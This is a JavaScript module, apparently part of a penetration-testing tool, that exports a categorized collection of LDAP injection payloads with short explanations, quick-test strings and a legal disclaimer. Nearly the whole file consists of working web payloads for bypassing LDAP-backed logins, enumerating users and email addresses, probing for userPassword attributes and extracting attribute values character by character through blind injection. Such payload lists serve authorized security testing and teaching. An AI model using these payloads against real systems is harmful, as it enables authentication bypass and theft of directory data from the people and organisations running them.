// LDAP Injection Payload Generator - Educational Penetration Testing Tool
// WARNING: For authorized testing and educational purposes only

export const LDAP_INJECTION_CATEGORIES = {
  AUTHENTICATION_BYPASS: 'Authentication Bypass',
  INFORMATION_DISCLOSURE: 'Information Disclosure',
  BLIND_INJECTION: 'Blind Injection',
  SEARCH_FILTER_INJECTION: 'Search Filter Injection',
  SPECIAL_CHARS: 'Special Character Tests',
};

export const payloads = {
  AUTHENTICATION_BYPASS: [
    {
      name: 'Wildcard bypass',
      description: 'Use * to match any value for username/password',
      payload: `*`,
      explanation: 'In LDAP, * is a wildcard. Entering * for username and/or password may return the first matching entry.',
    },
    {
      name: 'Always-true filter (username)',
      description: 'Inject always-true condition into username field',
      payload: `*)(uid=*))(|(uid=*`,
      explanation: 'Closes the original filter and injects an always-true condition.',
    },
    {
      name: 'Admin bypass with OR',
      description: 'Inject OR condition to bypass authentication',
      payload: `admin)(&)`,
      explanation: 'Injects (&) which evaluates to TRUE in some LDAP implementations.',
    },
    {
      name: 'Null byte injection',
      description: 'Truncate filter with null byte',
      payload: `admin\x00`,
      explanation: 'Null byte may truncate the LDAP filter string prematurely in some implementations.',
    },
    {
      name: 'OR-based admin login',
      description: 'Authenticate as admin without knowing password',
      payload: `*)(|(password=*`,
      explanation: 'Constructs a filter that authenticates any user whose password attribute exists.',
    },
    {
      name: 'Close and inject',
      description: 'Close existing filter and inject new condition',
      payload: `)(objectClass=*`,
      explanation: 'Closes the existing parenthesis and adds a filter that matches any object.',
    },
  ],

  INFORMATION_DISCLOSURE: [
    {
      name: 'Enumerate all users',
      description: 'Return all objects with uid attribute',
      payload: `*)(uid=*)`,
      explanation: 'Wildcard uid filter returns all user objects in the directory.',
    },
    {
      name: 'Extract email addresses',
      description: 'Filter for objects with mail attribute',
      payload: `*)(mail=*`,
      explanation: 'Returns objects that have a mail attribute, disclosing email addresses.',
    },
    {
      name: 'Extract all attributes',
      description: 'Return objects of any class',
      payload: `*)(objectClass=*`,
      explanation: 'Matches all LDAP objects regardless of class, potentially exposing all entries.',
    },
    {
      name: 'Person objects only',
      description: 'Enumerate person-type objects',
      payload: `*)(objectClass=person`,
      explanation: 'Returns only objects with class "person" to enumerate human accounts.',
    },
    {
      name: 'Password attribute disclosure',
      description: 'Search for userPassword attribute',
      payload: `*)(userPassword=*`,
      explanation: 'Retrieves objects that have a userPassword attribute set.',
    },
    {
      name: 'Admin group members',
      description: 'Find admin group membership',
      payload: `*)(memberOf=cn=admin`,
      explanation: 'Looks for users who are members of the admin group.',
    },
  ],

  BLIND_INJECTION: [
    {
      name: 'True condition (first char a)',
      description: 'Boolean-based: test if first char of cn is "a"',
      payload: `*)(cn=a*`,
      explanation: 'Returns results only if the cn attribute starts with "a" — used for char-by-char enumeration.',
    },
    {
      name: 'Single character brute force',
      description: 'Enumerate cn starting with known prefix',
      payload: `*)(cn=adm*`,
      explanation: 'Progressively narrow down attribute values by extending the prefix.',
    },
    {
      name: 'Attribute existence check',
      description: 'Test whether an attribute exists',
      payload: `*)(description=*`,
      explanation: 'Returns results only if the description attribute is present on any object.',
    },
    {
      name: 'Numeric attribute test',
      description: 'Test for numeric uidNumber value',
      payload: `*)(uidNumber>=0`,
      explanation: 'Matches objects whose uidNumber is >= 0, confirming attribute existence.',
    },
    {
      name: 'Differential timing test',
      description: 'Large search for timing-based detection',
      payload: `*)(cn=*)(|(cn=a)(cn=b)(cn=c)(cn=d)(cn=e)(cn=f`,
      explanation: 'Larger filter triggers more processing — measurable timing difference in blind scenarios.',
    },
  ],

  SEARCH_FILTER_INJECTION: [
    {
      name: 'Nested filter injection',
      description: 'Inject nested OR filter',
      payload: `*)(|(objectClass=*`,
      explanation: 'Injects a nested OR filter to expand the result set.',
    },
    {
      name: 'NOT operator injection',
      description: 'Inject NOT condition to exclude results',
      payload: `*)(!(objectClass=inetOrgPerson`,
      explanation: 'NOT operator narrows results — useful for verifying injection and enumeration.',
    },
    {
      name: 'AND filter injection',
      description: 'Inject AND condition',
      payload: `admin)(&(objectClass=*`,
      explanation: 'Adds an AND condition that evaluates to true for all entries.',
    },
    {
      name: 'Extensible match filter',
      description: 'Use extensible match operator',
      payload: `*)(cn:caseExactMatch:=admin`,
      explanation: 'Uses LDAP extensible match to perform a case-exact comparison.',
    },
    {
      name: 'Substring filter injection',
      description: 'Inject substring match filter',
      payload: `*)(sn=*son*`,
      explanation: 'Matches objects where surname contains "son" — useful for user enumeration.',
    },
  ],

  SPECIAL_CHARS: [
    {
      name: 'Closing parenthesis',
      description: 'Test if ) character is filtered',
      payload: `)`,
      explanation: 'Unmatched ) may cause a syntax error revealing injection point.',
    },
    {
      name: 'Asterisk wildcard',
      description: 'Test wildcard expansion',
      payload: `*`,
      explanation: 'Wildcard * should be filtered; if not, it matches any value.',
    },
    {
      name: 'Backslash encoding',
      description: 'Test LDAP special char encoding',
      payload: `\\2a`,
      explanation: 'LDAP-encodes * as \\2a; some implementations decode it improperly.',
    },
    {
      name: 'Null byte',
      description: 'Test null byte handling',
      payload: `\\00`,
      explanation: 'LDAP-encodes null byte; may truncate filter in vulnerable implementations.',
    },
    {
      name: 'Open parenthesis',
      description: 'Test if ( character is filtered',
      payload: `(`,
      explanation: 'Unmatched ( may cause filter parsing errors revealing injection.',
    },
    {
      name: 'Pipe character',
      description: 'Test pipe character filtering',
      payload: `|`,
      explanation: 'Pipe (|) is the OR operator in LDAP filters.',
    },
    {
      name: 'Ampersand',
      description: 'Test ampersand filtering',
      payload: `&`,
      explanation: 'Ampersand (&) is the AND operator in LDAP filters.',
    },
  ],
};

export function getAllCategories() {
  return Object.entries(LDAP_INJECTION_CATEGORIES).map(([key, label]) => ({
    key,
    label,
  }));
}

export function getPayloadsByCategory(categoryKey) {
  return payloads[categoryKey] || [];
}

export const QUICK_TEST_PAYLOADS = [
  '*',
  '*)(&',
  '*)(uid=*))(|(uid=*',
  ')(objectClass=*',
  'admin)(&)',
  '*)(|(password=*',
];

export const LDAP_FILTER_SYNTAX = {
  AND: '(&(filter1)(filter2))',
  OR: '(|(filter1)(filter2))',
  NOT: '(!(filter))',
  EQUALITY: '(attr=value)',
  SUBSTRING: '(attr=*value*)',
  PRESENT: '(attr=*)',
};

export const LEGAL_DISCLAIMER = `⚠️ LEGAL & ETHICAL DISCLAIMER: This tool is for AUTHORIZED SECURITY TESTING & EDUCATIONAL PURPOSES ONLY. Only use with explicit written authorization from the system owner. Unauthorized LDAP injection attacks are illegal and may result in criminal prosecution.`;
